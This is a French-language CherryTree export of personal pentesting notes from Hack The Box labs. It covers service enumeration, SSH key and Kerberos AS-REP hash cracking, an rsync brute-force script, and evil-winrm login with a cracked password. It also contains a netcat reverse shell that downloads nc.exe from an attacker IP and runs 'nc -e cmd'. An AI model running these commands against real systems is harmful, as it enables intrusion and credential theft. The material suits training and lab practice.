					<codebox char_offset="532" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">git log</codebox>
					<codebox char_offset="571" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">git diff commit_number</codebox>
					<codebox char_offset="1000" frame_height="100" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">Host dinesh-craft
	Hostname 10.10.10.110
	User dinesh
	Port 6022
	IdentityFile /root/Desktop/HTB/craft/ssh/dinesh</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="mountd_nfs" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1587914532.1" unique_id="127">
					<rich_text>Source : https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/NFS-RPC/commands.txt

Le port 2049 est le port par défaut de nfs qui est un système de fichier
Enumération des partitions partagés:
showmount -e $ip_address 

Monter la partition partagée :
mkdir /tmp/mnt
mount -t nfs $ip_address:/site_backups /tmp/mnt -nolock

</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="rpc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1587512564.91" unique_id="140">
					<rich_text>RPC (remote procedure call) est un protocole réseau permettant de faire des appels de procédures sur un ordinateur distant à l'aide d'un serveur d'applications. Ce protocole est utilisé dans le modèle client-serveur pour assurer la communication entre le client, le serveur et d’éventuels intermédiaires.

On peut utiliser un service RCP actif pour notre phase de reconnaissance :
1. Pour se connecter :
rpcclient -U &quot;&quot; forest.htb

2. Énumérer les users
enumdomusers

3. Informations sur le domaine
querydominfo


</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="smb" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1587914565.18" unique_id="146">
					<rich_text>

On découvre un service SMB (partage de fichier) généralement sur le port 445

On vérifie si l'accès anonyme est autorisé :
On liste les partages avec la commande :
smbclient -N -L \\\\$ip_address \\

Résultat :
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
Connection to $ip_address  failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

On remarque le partage backups, pour y accéder :
smbclient -N \\\\$ip_address\\backups

Avec la commande :
			- help on affiche l'aide, 
			- dir le contenu du répertoire courant,
			- more le contenu d'un fichier,
			- get télécharge le fichier

Ici des identifiants sont présent dans le seul fichier de backup

</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="ssh" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587481983.18" ts_lastsave="1588245536.54" unique_id="173">
					<rich_text>


</rich_text>
					<rich_text scale="h2">Établir une connexion ssh par clef</rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h3">1. Générer sur le client le duo clef publique / privé</rich_text>
					<rich_text>

</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h3">2. Ajouter sur le serveur la clef privée générée dans le fichier </rich_text>
					<rich_text>

/home/$username/.ssh/authorized_keys



</rich_text>
					<rich_text scale="h2">Accès après récupération d'une clef privée</rich_text>
					<rich_text>

1. Cracker les mdp de clef privé

</rich_text>
					<rich_text link="fold L3Vzci9zaGFyZS9qb2hu">/usr/share/john</rich_text>
					<rich_text>/ssh2john.py mets en forme pour john
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

2. Se connecter avec la clef privé

</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

3.ssh port forwarding

</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
            L port destination (sur notre machine)
                    L Adresse cible 
                                L Port cible (sur la machine cible)
                                 L</rich_text>
					<codebox char_offset="94" frame_height="40" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">ssh-keygen
chmod 600 clef_privée</codebox>
					<codebox char_offset="334" frame_height="40" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">python3 /usr/share/john/ssh2john.py crack
john --wordlist=/usr/share/wordlists/rockyou.txt crack</codebox>
					<codebox char_offset="373" frame_height="40" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">ssh -i user@address
mot_de_passe_cracké</codebox>
					<codebox char_offset="399" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="plain-text" width_in_pixels="True">ssh -L 80:127.0.0.1:80 user@ip_cible -i /home/ullur/.ssh/id_rsa</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Web" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587484618.67" ts_lastsave="1587513124.83" unique_id="176">
					<rich_text>Upload un fichier en ligne de commande :
curl http://@ip:@port -T nom_fichier --output nom_fichier_réponse

</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="BDD" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587644299.59" ts_lastsave="1587654824.07" unique_id="27">
					<rich_text></rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="SQLserver" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1587644304.88" unique_id="21">
						<rich_text>
</rich_text>
						<rich_text scale="h2">1. Connexion à SQL Server</rich_text>
						<rich_text>
“Nécessite les identifiants”

On install Impacket qui permet nottament a programmation bas niveau de protocole réseau.
Pour cela :
</rich_text>
						<rich_text justification="left"></rich_text>
						<rich_text>
 
De nouveaux packets sont installés nottament :
</rich_text>
						<rich_text weight="heavy">mssqlclient.py</rich_text>
						<rich_text> qui permet de nous connecter à la bdd

Pour se connecter : </rich_text>
						<rich_text justification="left"></rich_text>
						<rich_text>

</rich_text>
						<rich_text weight="heavy">!</rich_text>
						<rich_text> si user en deux parties utiliser / et non \

 
</rich_text>
						<codebox char_offset="158" frame_height="50" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .</codebox>
						<codebox char_offset="283" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">mmsqlclient.py user@adresse -windows-auth</codebox>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="MySql" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587644313.87" ts_lastsave="1587644316.62" unique_id="28">
						<rich_text>• Dump d'une base de données
mysqldump -u $usrername -p --all-database </rich_text>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="FTP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587827608.39" ts_lastsave="1587827623.12" unique_id="43">
					<rich_text>Connexion ftp as anonymous user

ftp ?address

user : anonymous
password : 

</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="rsync" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587832530.94" ts_lastsave="1587836707.97" unique_id="45">
					<rich_text scale="h2" style="italic">Logiciel libre de synchronisation de fichiers</rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h2">• lister les fichiers dispo :</rich_text>
					<rich_text>
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h2">• récupérer des fichiers via rsync</rich_text>
					<rich_text>
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h2">• Récupérer en tant que user</rich_text>
					<rich_text>
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>


</rich_text>
					<rich_text scale="h2">• script bash pour bruteforcer le password d'un user </rich_text>
					<rich_text>
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<codebox char_offset="77" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">rsync rsync://[$ip_address]:$port --list-only</codebox>
					<codebox char_offset="115" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">rsync rsync://[$ip_address]:$port/file_path local_destination -a</codebox>
					<codebox char_offset="147" frame_height="40" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">export RSYNC_PASSWORD=$pass
rsync rsync://user@[adress_ip]:port/destination_path -a</codebox>
					<codebox char_offset="205" frame_height="240" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">#!/bin/bash
for pass in $(cat wordlist.txt);
do 
    export RSYNC_PASSWORD=$pass
    # rsync -q rsync://roy@[dead:beef::250:56ff:feb9:c2ce]:8730/home_roy --list_only 2&gt;/dev/null
    rsync -q rsync rsync://user@[adress_ip]:port/destination_path --list_only 2&gt;/dev/null
    
    if [[ $? -eq 0 ]]
    then
        echo “Pass: $pass”
        break
    fi    
done</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="kerberos" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588201079.77" ts_lastsave="1588201885.66" unique_id="2">
					<rich_text>Message kerberos
On trouve la significtion des messages kerberos sur le site suivant :
</rich_text>
					<rich_text link="webs https://docs.microsoft.com/fr-fr/windows/security/threat-protection/auditing/event-4768">https://docs.microsoft.com/fr-fr/windows/security/threat-protection/auditing/event-4768</rich_text>
					<rich_text>


</rich_text>
					<rich_text scale="h2">1. Se synchroniser avec le DC kerberos</rich_text>
					<rich_text>
Si on tombe sur ce type d'erreur :
KDC_ERR_NEVER_VALID
Cela veut dire que nous sommes désynchronisé avec le DC il faut donc utiliser les commandes suivantes :
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h2">2. Exploitation par ASREPRoast</rich_text>
					<rich_text>
&quot;&quot;&quot;
En résumé, l’attaque consiste à vérifier si un utilisateur du domaine ne requiert pas de pré-authentification Kerberos, et si c’est le cas, on peut récupérer des informations chiffrées concernant le compte de l’utilisateur, qu’on peut ensuite craquer hors-ligne pour y trouver son mot de passe.
&quot;&quot;&quot;
l'outil de impacket permet de tester la vulnérabilité

</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

Résultat :
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>


On voit que svc_alfresco a UF_DONT_REQUIRE_PREAUTH parametré

</rich_text>
					<rich_text scale="h3">    b/ Enregistrer le hash</rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h3">    c/ Chercher à cracker le hash</rich_text>
					<rich_text>

    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

    Le mot de passe est s3rvice

    </rich_text>
					<rich_text scale="h3">d/ Connexion via WinRm au port 5985 en utilisant evil-winrm</rich_text>
					<rich_text>
    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
</rich_text>
					<codebox char_offset="375" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="plain-text" width_in_pixels="True">ntpdate $ip_address</codebox>
					<codebox char_offset="767" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">GetNPUsers.py htb.local/ -dc-ip  -usersfile users.txt</codebox>
					<codebox char_offset="781" frame_height="500" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">root@kali:~/Desktop/HTB/forest# GetNPUsers.py htb.local/ -dc-ip forest.htb -usersfile users.txt
Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:f26e2d83a61e519f5b4b34c08bc39daf$8e855ad842448aca2f030281624db45d217a8b5ab72d0c10eede9defe517a3a64c0675f55291427326e9c30c8d287dabc9946ca767981ce569b49a8a6bb9893182461643ef99392ebd2c171fdceccfb0bb9f1eee0c49db16bb3cf7384f4d3ccf99d70a331db94121403933b9c1821cd1000d3112d375565facb7ef9ca953cf1d2201a307d3f4c1f9331e9589a516bbe13858a73a00b501d532eff8fd5c7a9a70b66d35464952032980809bf7cd59aadcf91bd368f6467a3512dc0df95347890d2bbc6b212c1b9215c7e211c64809c3fc99f129347701ecad6b633f77c1dd39639658da09e323
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set</codebox>
					<codebox char_offset="914" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">john --wordlist=/usr/share/wordlists/rockyou.txt krb5.hash</codebox>
					<codebox char_offset="1018" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice</codebox>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="OS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587513027.89" ts_lastsave="1587513044.88" unique_id="22">
				<rich_text></rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587510234.11" ts_lastsave="1587647618.7" unique_id="10">
					<rich_text>
</rich_text>
					<rich_text scale="h3">• Recherche de fichier</rich_text>
					<rich_text>
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

-name sensible à la casse
-iname non sensible à la casse 

Afficher les ports ouverts :
netstat -tnullp

Récupérer les mots possédant un chaîne de caractère :
awk -F 'ABCD' '{print $1}'

</rich_text>
					<codebox char_offset="24" frame_height="40" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">find racine_recherche -name chaine_recherché
find ./ -iname *.hash</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587513044.88" ts_lastsave="1588258515.57" unique_id="24">
					<rich_text>dir -&gt; afficher le contenu d'un répertoire
cd -&gt; se déplacer
type → afficher le contenu d'un fichier

wget </rich_text>
					<rich_text link="webs http://10.10.14.11/SharpHound.ps1">http://10.10.14.11/SharpHound.ps1</rich_text>
					<rich_text> -UseBasicParsing -O $destination -&gt; pour télécharger un fichier si internet explorer n'est pas (correctement) installé


                                    Reverse shell
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

Elevation de privilège windows
</rich_text>
					<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</rich_text>
					<rich_text>


share smb
monter serveur smb avec impacket

Charger un script ps1
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
On peut alors appeler ses méthodes


</rich_text>
					<rich_text weight="heavy">Endroit libre d'ecriture caché sur windows</rich_text>
					<rich_text>
c:/windows/system32/spool/drivers/color



DLL -&gt; dépendance / librairies

Clef de registre -&gt; structure de données très facilement accessible


Arrivé sur une machine windows le module Powerup avec sa fonction Invoke-AllChecks est très intéressant pour l'énumération
Location : </rich_text>
					<rich_text link="fold L2hvbWUvdWxsdXIvRGVza3RvcC90b29scy9Qb3dlclNwbG9pdC9Qcml2ZXNj">/home/ullur/Desktop/tools/PowerSploit/Privesc</rich_text>
					<rich_text>
Partage avec : python -m SimpleHTTPServer 80
Récupération avec : wget $ip_addrees/PowerUp.ps1 -O PowerUp.ps1

</rich_text>
					<rich_text justification="left"></rich_text>
					<codebox char_offset="312" frame_height="120" frame_width="700" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="plain-text" width_in_pixels="True">@Attacker Terminal1
rlwrap nc -l -vv -p 6666
@Attacker Terminal2
cd /usr/share/windows-resources/binaries ;  python -m SimpleHTTPServer 80
@Target
wget http://10.10.14.11/nc.exe -O nc.exe
.\nc.exe 10.10.14.11 6666 -e cmd</codebox>
					<codebox char_offset="548" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="plain-text" width_in_pixels="True">Import-Module .\PowerUp.ps1</codebox>
					<codebox char_offset="1065" frame_height="40" frame_width="700" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="plain-text" width_in_pixels="True">*Evil-WinRM* PS C:\Users\user\Documents&gt; Import-Module .\PowerUp.ps1
*Evil-WinRM* PS C:\Users\user\Documents&gt; Invoke-AllChecks</codebox>
					<node custom_icon_id="0" foreground="" is_bold="False" name="ACL" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588257648.45" ts_lastsave="1588258237.92" unique_id="18">
						<rich_text>
Pour afficher les ACL on peut utiliser le module PowerView de la suite Powersploit
Location : /home/ullur/Desktop/tools/PowerSploit/Recon
</rich_text>
						<rich_text justification="left"></rich_text>
						<rich_text>

</rich_text>
						<rich_text weight="heavy">IdentityReference</rich_text>
						<rich_text> a le droit donner par l'</rich_text>
						<rich_text weight="heavy">ACL</rich_text>
						<rich_text> nottament via l'</rich_text>
						<rich_text weight="heavy">ObjectType</rich_text>
						<rich_text> sur </rich_text>
						<rich_text weight="heavy">ObjectDN</rich_text>
						<rich_text>

Certaines fois les ObjectType des ACL sont nommés par leur UID. On trouve leur correspondance : </rich_text>
						<rich_text link="webs https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb</rich_text>
						<rich_text>

</rich_text>
						<rich_text weight="heavy">GenericAll</rich_text>
						<rich_text> -&gt; tous les droits

</rich_text>
						<rich_text weight="heavy">LOCAL</rich_text>
						<rich_text> est la racine</rich_text>
						<codebox char_offset="139" frame_height="40" frame_width="700" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="plain-text" width_in_pixels="True">Import-Module .\PowerView.ps1	
Invoke-ACLScanner</codebox>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="Clef de registre" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588258288.66" ts_lastsave="1588258316.24" unique_id="29">
						<rich_text>Les clefs de registres peuvent être très intérressantes :

Nottament celle d'autologin :
</rich_text>
						<rich_text justification="left"></rich_text>
						<rich_text>

On peut aussi les lister avec Winpeas.bat

ou encore avec

</rich_text>
						<codebox char_offset="89" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="plain-text" width_in_pixels="True">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; </codebox>
					</node>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Outils" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587513066.7" ts_lastsave="1588237105.28" unique_id="25">
				<rich_text></rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587472489.96" ts_lastsave="1587513133.94" unique_id="161">
					<rich_text>

</rich_text>
					<rich_text scale="h1">1. Initialisation </rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h2">3. Charger la base de donnée</rich_text>
					<rich_text>
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h2">2. Lancer metasploit</rich_text>
					<rich_text>
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
</rich_text>
					<rich_text scale="h1">2. Commandes</rich_text>
					<rich_text>
</rich_text>
					<codebox char_offset="51" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">msfdb init</codebox>
					<codebox char_offset="75" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">msfconsole
</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587829600.66" ts_lastsave="1587829602.46" unique_id="44">
					<rich_text>Scan ipv6 
-6

</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Méthodes" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587513081.76" ts_lastsave="1587513081.76" unique_id="26">
				<rich_text></rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="en-decode" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1587663547.98" unique_id="118">
					<rich_text>Le site suivant permet de décoder tout sorte d'encodage et de détecter les types d'encodage : </rich_text>
					<rich_text link="webs https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</rich_text>
					<rich_text>

1. Détection de l'encodage

</rich_text>
					<rich_text link="webs https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</rich_text>
					<rich_text>

Détection de l'encodage :
2. Base64

   1) Décoder :
     </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

   2) Encoder :
     </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

Bk1rJfFB9NkWHiOdSluQ</rich_text>
					<codebox char_offset="250" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">echo -n chaine_base64 | base64 -d</codebox>
					<codebox char_offset="274" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">echo -n chaine_str | base64 -e</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="bruteforce" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1587836391.16" unique_id="23">
					<rich_text scale="h1">1. bruteforce de hash</rich_text>
					<rich_text>

</rich_text>
					<rich_text style="italic">&quot;&quot;&quot;exemple avec un hash de d'active directory nommé krb5.hash&quot;&quot;&quot;</rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h2">   1) John</rich_text>
					<rich_text>
    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
 
</rich_text>
					<rich_text scale="h2">  2) hashcat</rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h3">      1- Identification du type de hash</rich_text>
					<rich_text>
         ◇ Par nom
            Si on sait déjà quel type de hash est utilié, faire :          
             </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
        
         ◇ Par Comparaison
            Si l'on ne possède pas le nom du hash utilisé on peut tenter de le trouver par comparaison avec le site suivant :
            </rich_text>
					<rich_text link="webs https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</rich_text>
					<rich_text>

            Ce site permet de trouver automatiquement le type de hash
            </rich_text>
					<rich_text link="webs https://www.tunnelsup.com/hash-analyzer/">https://www.tunnelsup.com/hash-analyzer/</rich_text>
					<rich_text>

            Puis en recherchant par nom (voir premier point)


</rich_text>
					<rich_text style="italic">    “”&quot;Ici on a un hash de type &quot;Kerberos 5 AS-REP etype 23&quot; avec comme identifiant hashcat 18200“”&quot;</rich_text>
					<rich_text>
 
</rich_text>
					<rich_text scale="h3">      2- Crack du hash</rich_text>
					<rich_text>
        
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

-m spécifie l'identifiant du hash ici 18200
--force à cause des problème de compatibilité
-a pour le mode d'attaque </rich_text>
					<rich_text style="italic">(par défaut 0)</rich_text>
					<rich_text>
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
Plus d'info ici : </rich_text>
					<rich_text link="webs https://hashcat.net/forum/thread-1609-post-9158.html#pid9158">https://hashcat.net/forum/thread-1609-post-9158.html#pid9158</rich_text>
					<rich_text>

Résultat :

</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text style="italic">Le mot de passe est : s3rvice</rich_text>
					<rich_text>



</rich_text>
					<rich_text scale="h1">2. Création de dico </rich_text>
					<rich_text>
Si on peut voir la </rich_text>
					<rich_text weight="heavy">taille du fichier</rich_text>
					<rich_text> ou est stocké le mot de passe et que l'on possède le </rich_text>
					<rich_text weight="heavy">username</rich_text>
					<rich_text> on peut probablement </rich_text>
					<rich_text weight="heavy">déduire la taille du mot de passe</rich_text>
					<rich_text>

On regarde la forme du fichier de config par défaut du service. On compare sa taille avec celui du fichier cible.
</rich_text>
					<rich_text style="italic">On rappel qu'un caractère est stocké sur un 1 octet.</rich_text>
					<rich_text>

Si le fichier de conf est sous la forme : user:password
on déduit simplement la taille du mot de passe par :
taille mot de passe = taille fichier - strlen(username+&quot;:&quot;) 
si les espaces dans le fichier de conf sont acceptés alors la taille du mot de passe peut faire un caractère de moins.

exemple :
On connait l'user : roy
Le fichier rsyncd.secrets fait 13 octets
Il prends la forme -&gt; user:password
Il est possible de mettre un espace avant le mot de passe.
Le mot de passe fait donc entre 8 et 9 caractères


On peut soit choisir de générer avec crunch notre mot de passe ou extraire tous les mots de passe de cette taille depuis un dictionnaire existant. 


Extraction des mots de passe de 8 à 9 caractères de rockyou.txt
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h1">3. exemple de bruteforce via script</rich_text>
					<rich_text>


</rich_text>
					<rich_text scale="h2">   1) Via script bash pour le service rsync</rich_text>
					<rich_text>

</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>






    
 
 



</rich_text>
					<codebox char_offset="104" frame_height="220" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">john --wordlist=~/Desktop/tools/wordlist/rockyou.txt krb5.hash

    [...]
    Using default input encoding: UTF-8
    Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
    Will run 2 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
    1g 0:00:00:07 DONE (2020-04-14 11:26) 0.1353g/s 552876p/s 552876c/s 552876C/s s3xirexi..s3r2s1
    Use the &quot;--show&quot; option to display all of the cracked passwords reliably
    Session completed</codebox>
					<codebox char_offset="270" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">hashcat -h | grep type_hash</codebox>
					<codebox char_offset="821" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">hashcat -a 0 -m 18200 krb5.hash ../../tools/wordlist/rockyou.txt -O --force</codebox>
					<encoded_png char_offset="955"></encoded_png>
					<codebox char_offset="1049" frame_height="300" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">hashcat (v5.1.0) starting...
OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2048/5930 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
